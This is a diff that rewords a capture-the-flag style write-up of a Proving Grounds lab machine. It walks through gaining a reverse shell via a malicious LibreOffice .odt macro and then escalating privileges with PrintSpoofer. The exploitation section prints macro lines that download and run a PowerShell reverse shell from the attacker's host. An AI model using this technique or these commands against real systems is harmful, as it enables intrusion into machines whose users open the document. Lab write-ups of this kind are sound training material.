@@ -12,19 +12,19 @@ IP: 192.168.229.169
 
 
 # Resolution summary
-- Found webpage with upload file capabilities 
-- Uploaded an .otd file with a macro to initiate a reverse shell
-- Unable to locate a privilege escalation vector with user thecybergeek
-- Found another non default user apache
-- Found thecybergeek user can write to the web root directory C:/xampp/htdocs
+- Discovered a webpage that allows file uploading
+- Started a reverse shell by uploading a.otd file using a macro.
+- With user thecybergeek, no privilege escalation path could be found.
+- Discovered another non-default Apache user
+- Discovered that the user of Cybergeek can write to the C:/xampp/htdocs web root directory.
 - Downloaded a cmd.php file to web root directory
-- Navigated to the php command shell in firefox which confirmed we have RCE as user apache
-- Downloaded a reverse.ps1 reverse shell to the box with the php command shell
-- Initiated the reverse shell with the php command shell
-- Found apache user has SeImpersonate privileges enabled 
-- Found the box is running Windows Server 2019 Standard on OS Version 10.0.17763 and x64 based PC
+- Opened the Firefox php command shell and verified that RCE is the user apache.
+- A reverse.ps1 shell was downloaded to the box containing the PHP command shell.
+- Using the PHP command shell, the reverse shell was started.
+- The Apache user that was found has enabled SeImpersonate privileges. 
+- Discovered that the machine is an x64-based PC running Windows Server 2019 Standard with OS Version 10.0.17763.
 - Downloaded PrintSpoofer64.exe on the target machine 
-- Initiated the PrintSpoofer64.exe privilege escalation exploit and received a shell running as nt/authority system
+- Started the privilege escalation attack PrintSpoofer64.exe and obtained a shell operating as the nt/authority system
 
 ## Improved skills
 - LibreOffice
@@ -75,89 +75,92 @@ Enumerated top 200 UDP ports:
 # Enumeration
 ## Port 80 - HTTP (Apache)
 
-#### - Navigated to "http://192.168.122.169" and found the following webpage:
-
+- The following webpage was discovered when we navigated to "http://192.168.122.169":
+  
 ![](Images/Pasted%20image%2020230407224047.png)
 
-#### - Found the following where we can upload our "resume":
-
+- We can upload our "resume" to the following link, we found:
+  
 ![](Images/Pasted%20image%2020230407224227.png)
 
-#### - Tried to upload a random file and received the following:
-
+- When we attempt to upload an arbitrary file, we receive the following:
+  
 ![](Images/Pasted%20image%2020230407224319.png)
 
-#### - Googled ".odt file" and found the following page showing .odt files are typically created by OpenOffice and LibreOffice Writer programs:
-
+- We researched the “.odt” file format and found that it is typically created by OpenOffice and LibreOffice Writer programs. We install LibreOffice on our Kali Linux machine and create a macro that initiates a reverse shell.
+  
 ![](Images/Pasted%20image%2020230407224402.png)
 
 ![](Images/Pasted%20image%2020230407224442.png)
 
-#### - I then downloaded LibreOffice on my kali machine by typing "sudo apt-get install -y libreoffice-writer"
+- On our Kali machine, we execute "sudo apt-get install -y libreoffice-writer" to download LibreOffice.
 
-#### - Started LibreOffice and clicked "Writer Document":
-
+- After opening LibreOffice, we select "Writer Document":
+  
 ![](Images/Pasted%20image%2020230407224535.png)
 
-#### - Clicked Tools > Macros > Organize Macros > Basic:
-
+- We click Tools > Macros > Organize Macros > Basic:
+  
 ![](Images/Pasted%20image%2020230407224628.png)
 
-#### - Clicked "Untitled 1" > "New" and named the file Offsec1 and clicked "OK":
+- We select "Untitled 1" > "New", give the file the name Offsec1, and then select "OK":
 
 ![](Images/Pasted%20image%2020230407224715.png)
 
-#### - Typed Tab > Shell ("cmd /c powershell iwr [Kali IP]") between "Sub Main" and "End Sub" (which will perform an HTTP request to our IP). If we are hosting on port 80 and port is open the command should execute:
-
+- We type Tab > Shell ("cmd /c powershell iwr [Kali IP]") between "Sub Main" and "End Sub". This will initiate an HTTP request to our IP. The following command ought to run if port 80 is being used for hosting and it is open:
+  
 ![](Images/Pasted%20image%2020230407225512.png)
 
-#### - Clicked File > Save 
-
+- We click File > Save
+  
 ![](Images/Pasted%20image%2020230407230026.png)
 
-#### - Named the file "Offesec1" and clicked Save:
-
+- We name the file “Offesec1” and click Save:
+  
 ![](Images/Pasted%20image%2020230407230118.png)
 
-#### - Closed out of the Offsec.odt document
+- We close out of the Offsec.odt document
 
-#### - I then attached the macro/script to an event by clicking Tools > customize and in the "Events" tab > Open Document > Macro > double cick Offesec1.odt > double click Standard > click Offsec1 > click Main > click OK:
+- We attach the script/macro to an event, by performing the following:
+
+select Tools > Customize.
 
 ![](Images/Pasted%20image%2020230407230317.png)
 
+- Select the "Events" tab > click Open Document > click Macro
+
 ![](Images/Pasted%20image%2020230407230358.png)
+
+- Double click Offesec1.odt > double click Standard > click Offsec1 > click Main > click OK.
 
 ![](Images/Pasted%20image%2020230407230439.png)
 
-#### - Now the Event "Open Document" is assigned an action:
-
+- Now an action has been allocated to the Event "Open Document":
+  
 ![](Images/Pasted%20image%2020230407230524.png)
 
-#### - Clicked "File" then "Save"
+- We click "File" then click "Save"
 
-
-#### - Typed "updog -p 80" (in the same directory where the newly created Offsec1.odt file is located in) on my kali machine to host the .odt file:
+- To host the.odt file on our Kali machine, we type "updog -p 80" (in the same directory as the freshly created Offsec1.odt file):
 
 ![](Images/Pasted%20image%2020230407230715.png)
 
-#### - Navigated back to the webpage and clicked "browse" and chose my newly created ".odt" file and clicked upload and received the following page showing the file was accepted:
+-We return to the webpage, select "browse," upload our freshly created ".odt" file, and then receive the following screen indicating that the file was approved:
 
 ![](Images/Pasted%20image%2020230407230828.png)
 
 ![](Images/Pasted%20image%2020230407230856.png)
 
-#### - Looking back on our kali machine hosting the .odt file we received code 200 and confirm we have execution on the target machine in the event someone opens the document we just uploaded to the target site
-
+- A 200 code is received, verifying that the macro was successfully run and the.odt file was uploaded.
+  
 ![](Images/Pasted%20image%2020230407230954.png)
 
----
-
 # Exploitation
-## Upload Of An .odt File With A Macro To Initiate A Reverse Shell
+## Uploading an .odt File Including A Macro To Launch A Reverse Shell
 
-#### - Navigated back into the offsec1.odt file in LibreOffice Basic and clicked edit
+- We return to LibreOffice Basic and select Edit on the offsec1.odt file.
 
-#### -Removed the previous powershell code we had in there before and replaced it with the following to download the offsec.ps1 reverse and to execute it:
+- To download and run the offsec.ps1 reverse shell, we remove the original powershell code that was there and replace it with the following code:
 
 Shell("cmd /c powershell iwr http://192.168.45.5:80/offsec.ps1 -o C:/Windows/Tasks/offsec.ps1")
 
@@ -165,15 +168,15 @@ Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
 
 ![](Images/Pasted%20image%2020230407231101.png)
 
-#### - Clicked File then save
+- We click File and save.
 
-#### - Typed vim offsec.ps1 on my kali machine
+-On our Kali machine, we type vim offsec.ps1.
 
-#### - Navigated to www.revshells.com
+- We access www.revshells.com.
 
 #### - Copied contents in between the quotation marks in the PowerShell #3 tab for Windows payload and pasted it into the offsec.ps1 file
 
-![](Images/Pasted%20image%2020230407231301.png)
+file:///home/parallels/Documents/Documents/Offensive-Security-Proving-Grounds-Boxes/Images/SCR-20240404-evj.png![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/2affc34d-2b58-4581-96e4-41d7aa74aa00)
 
 #### - Typed chmod 775 offsec.ps1 to make it executable
 
